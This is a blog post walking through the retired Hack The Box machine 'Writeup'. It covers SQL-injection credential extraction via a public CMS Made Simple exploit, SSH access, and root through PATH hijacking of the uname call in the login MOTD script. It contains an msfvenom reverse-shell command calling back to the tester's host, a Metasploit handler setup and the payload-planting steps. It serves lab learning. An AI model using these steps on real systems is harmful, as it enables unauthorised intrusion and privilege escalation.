---
layout: post
title: HackTheBox - Writeup
---

The Writeup box on Hack The Box retired a while ago, but I'm only just getting around to publishing a writeup on my experience rooting this fun and interesting box. It's one of the first boxes I've completed on Hack The Box and although it's rated 'Easy', I learned a lot!

I started by looking for open ports with Nmap:

```
sudo nmap -sS -sV -Pn -T4 -p- -oA writeup_nmap 10.10.10.138

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-23 08:37 BST
Nmap scan report for 10.10.10.138
Host is up (0.050s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.64 seconds
```

So we've got SSH and HTTP. Let's go check out the site on HTTP.

```

########################################################################
#                                                                      #
#           *** NEWS *** NEWS *** NEWS *** NEWS *** NEWS ***           #
#                                                                      #
#   Not yet live and already under attack. I found an   ,~~--~~-.      #
#   Eeyore DoS protection script that is in place and   +      | |\    #
#   watches for Apache 40x errors and bans bad IPs.     || |~ |`,/-\   #
#   Hope you do not get hit by false-positive drops!    *\_) \_) `-'   #
#                                                                      #
#   If you know where to download the proper Donkey DoS protection     #
#   please let me know via mail to jkr@writeup.htb - thanks!           #
#                                                                      #
########################################################################



aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
88888888888888888888888888888888888888888888888888888
8888"""""""""""""""8888888888888888888888888888888888
8888               8888888888888888888888888888888888
8888  HTB NOTES    8888888888888888888888888888888888
8888               888888888888888888888888888888888"
8888aaaaaaaaaaaaaaa888888888888888888888888888888888a
88888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888
88888888888888888888888":::::"88888888888888888888888
888888888888888888888::;gPPRg;::888888888888888888888
88888888888888888888::dP'   `Yb::88888888888888888888
88888888888888888888::8)     (8::88888888888888888888
88888888888888888888;:Yb     dP:;88( )888888888888888
888888888888888888888;:"8ggg8":;888888888888888888888
88888888888888888888888aa:::aa88888888888888888888888
88888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888
88888888888888888888888888"88888888888888888888888888
8888888888888888888888888:::8888888888888888888888888
8888888888888888888888888:::8888888888888888888888888
8888888888888888888888888:::8888888888888888888888888
8888888888888888888888888:::8888888888888888888888888
8888888888888888888888888:::8888888888888888888888888
88888888888888888888888888a88888888888888888888888888
"""""""""""""""""""' `"""""""""' `"""""""""""""""""""
                              (c) by Normand Veilleux


I am still searching through my backups so there is
nothing here yet. I am preparing go-live of my own
www.hackthebox.eu write-up page soon. Stay tuned!
```

The message at the top of that ASCII art on the homepage suggests using tools like dirbuster or gobuster for directory enumeration is not going to be easy/possible. Also worth nothing that there is a message at the bottom of the page that reads: "Page is hand-crafted with vi."

Let's try some manual content enumeration, starting with robots.txt

```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

When we visit `/writeup` what we see is a very plain looking page with links to several writeups in progress. The footer also reads: "Pages are hand-crafted with vim. NOT." which to me suggests a CMS of some sort is being used.

To confirm that hunch, I had a look at the head tag for the page. There we can see a meta tag for the generator, which confirms that a CMS called CMS Made Simple is in use. It's not a package I'm familiar with, so let's go look for known vulns! My site of choice for this is [CVE Details](www.cvedetails.com)

At the time of writing, there were 6 CVEs in 2019. Of those, the highest CVSS score is 6.8 for unauthenticated, blind time-based SQLi in the News module: [CVE-2019-9053](https://www.cvedetails.com/cve/CVE-2019-9053/). Additionally, this is the only CVE from 2019 at the time of writing that doesn't require authentication to exploit, which makes it an easy first choice. ExploitDB even has an exploit script ready to go: [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635).

The exploit requires a Python 2 environment with the requests and termcolor libraries available. I used pipenv to keep this neatly contained.

```
mkdir exploit
cd exploit
pipenv --two
pipenv install requests termcolor
pipenv shell
python exploit.py -u http://10.10.10.138/writeup --crack -w ~/Seclists/Passwords/Leaked-Databases/rockyou.txt
```

The exploit script will use the SQL injection vulnerability to extract the admin username, email address, password hash and password salt. Because the exploit takes advantage of a timing difference in the SQL query being executed, it is sensitive to any significant network jitter. There is a global variable called `TIME` that defaults to 1 second, which in my first attempt resulted in a bad result. I tried changing this to 5 seconds, which resulted in a slower run of the exploit but the result was actually usable.

Nicely, the exploit will also let you provide it with a wordlist for mounting a dictionary attack on the obtained password hash. Funnily, the output from the exploit looks a bit like movie hacking.

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

Tada! Now to put those credentials to work. I tried using them to access the CMS Admin page and spent ages trying to get it to work. The admin portal is protected with HTTP Basic Auth, and after a while I decided this was probably a rabbit hole and moved on. I took a step back and remembered that SSH was available and tried those credentils there and they worked. 

```
ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ cat user.txt
d4e493fd4068afc9eb1aa6a55319f978
```

Now I had an initial user shell, it was time for some post-compromise enumeration. For this, I initially tried using [LinEnum](https://github.com/rebootuser/LinEnum), but didn't find anything super useful.

Next I tried using a tool called [Pspy](https://github.com/DominicBreuker/pspy) for seeing what is running the box without requiring root privileges. Not much happened until someone logged on, then I saw this:

```
2019/07/24 08:41:28 CMD: UID=0    PID=15822  | sshd: [accepted]
2019/07/24 08:41:28 CMD: UID=102  PID=15823  | sshd: [net]
2019/07/24 08:41:32 CMD: UID=0    PID=15824  | sshd: jkr [priv]
2019/07/24 08:41:32 CMD: UID=0    PID=15825  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-mot
d.d > /run/motd.dynamic.new
2019/07/24 08:41:32 CMD: UID=0    PID=15826  | run-parts --lsbsysinit /etc/update-motd.d
2019/07/24 08:41:32 CMD: UID=0    PID=15827  | /bin/sh /etc/update-motd.d/10-uname
2019/07/24 08:41:32 CMD: UID=0    PID=15828  | sshd: jkr [priv]
2019/07/24 08:41:32 CMD: UID=1000 PID=15829  | sshd: jkr@pts/1
2019/07/24 08:41:32 CMD: UID=1000 PID=15830  | -bash
2019/07/24 08:41:32 CMD: UID=1000 PID=15831  | -bash
2019/07/24 08:41:32 CMD: UID=1000 PID=15832  | -bash
2019/07/24 08:41:32 CMD: UID=1000 PID=15833  | -bash
```

Let's break down what's going on here:

- When a user logs in via SSH, a command is triggered running as UID 0
- It is prefixed with `/usr/bin/env -i` to ignore the current environment. Then a custom path variable is passed with a number of locations in it
- run-parts is called, which is for running all scripts in a directory
- run-parts is running scripts in the /etc/update-motd.d directory and redirecting the output to /run/motd.dynamic.new

Let's take a look at the contents of /etc/update-motd.d/10-uname:

```
#!/bin/sh
uname -rnsom
```

So thinking back to when we first logged in over SSH, the script in /etc/update-motd.d are adding the output from uname to the top of the MOTD. Given that the command is providing it's own `PATH` environment variable, if we have write permission to a folder in that path that comes before the folder for the legitimate binary, we could put our own malicious binary in there and have that executed on user login as UID 0 instead of the legitimate `uname` binary, giving us privilege escalation.

The legitimate uname binary is located at `/bin/uname`, so if we could write to `/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin` or `/sbin`, we'got privilege escalation. 

Our user is unlikely to have ownership of any of those directories, but perhaps they're in a group with write access?

Let's find out what groups we're in first:
```
groups
jkr cdrom floppy audio dip video plugdev staff netdev
```

So we need one of the path directories that allow group writes and belong to any of those groups for us to hijack the call to uname.

```
ls -alh /usr
total 56K
drwxr-xr-x 10 root root  4.0K Apr 19 04:11 .
drwxr-xr-x 22 root root  4.0K Apr 19 07:31 ..
drwxr-xr-x  2 root root   20K Apr 24 13:13 bin
drwxr-xr-x  2 root root  4.0K Jun  3  2018 games
drwxr-xr-x  2 root root  4.0K Apr 19 04:21 include
drwxr-xr-x 41 root root  4.0K Apr 24 13:13 lib
drwxrwsr-x 10 root staff 4.0K Apr 19 04:11 local
drwxr-xr-x  2 root root  4.0K Apr 19 07:31 sbin
drwxr-xr-x 97 root root  4.0K Apr 24 13:13 share
drwxr-xr-x  2 root root  4.0K Jun  3  2018 src

ls -alh /usr/local
total 64K
drwxrwsr-x 10 root staff 4.0K Apr 19 04:11 .
drwxr-xr-x 10 root root  4.0K Apr 19 04:11 ..
drwx-wsr-x  2 root staff  20K Apr 19 04:11 bin
drwxrwsr-x  2 root staff 4.0K Apr 19 04:11 etc
drwxrwsr-x  2 root staff 4.0K Apr 19 04:11 games
drwxrwsr-x  2 root staff 4.0K Apr 19 04:11 include
drwxrwsr-x  4 root staff 4.0K Apr 24 13:13 lib
lrwxrwxrwx  1 root staff    9 Apr 19 04:11 man -> share/man
drwx-wsr-x  2 root staff  12K Apr 19 04:11 sbin
drwxrwsr-x  7 root staff 4.0K Apr 19 04:30 share
drwxrwsr-x  2 root staff 4.0K Apr 19 04:11 src
```

Both /usr/local/bin and /usr/local/sbin allow the staff group to write (but not read strangely enough). We're in business!

Let's start with generating a reverse shell to use as a payload. Initially I had issues with executing a slightly different payload, using a compiled binary payload, which is why I switched to the Python variant of the reverse meterpreter payload.

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.16.58 LPORT=4444 > uname
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 533 bytes
```

Next I needed to setup a listener in Metasploit to catch the incoming reverse shell connection.

```
msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set LHOST 10.10.16.58
LHOST => 10.10.16.58
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.58:4444
```

Now that everything is setup, let's try and get our payload to fire. This took me a couple of attempts to get it to work, which I believe is because there is a cleanup script running in the background, presumably so the box doesn't get cluttered with everyone's reverse shell payloads. Note that when you connect to SSH the connection should hang, but shell should connect back to metasploit listener.

```
# Local
scp uname jkr@10.10.10.138:/home/jkr/

# On target
chmod +x uname
cp uname /usr/local/bin/

# Local
ssh jkr@10.10.10.138 

# Metasploit handler
whoami
root
cat /root/root.txt
eeba47f60b48ef92b734f9b6198d7226
```

My takeaways from this box:
- I learned about the LinEnum and Pspy tools
- That you can use the `env` command to clear all environment variables for a command and replace them with your own

I hope you found this enjoyable and educational, happy hacking!
